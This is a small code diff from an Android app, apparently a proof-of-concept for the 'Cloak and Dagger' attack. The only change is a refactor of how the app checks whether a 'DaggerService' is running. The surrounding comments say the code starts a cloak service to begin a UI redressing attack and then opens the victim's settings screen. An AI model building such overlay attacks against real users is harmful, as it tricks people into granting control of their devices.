@@ -26,7 +26,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun startCloakService() {
         // No need for the cloak if the dagger already came out
-        if (!DaggerService.running) {
+        if (!DaggerService.isRunning()) {
             // Start the cloak service to begin the UI redressing attack
             startService(Intent(this, CloakService::class.java))
             // Launch victim settings activity and close this activity.
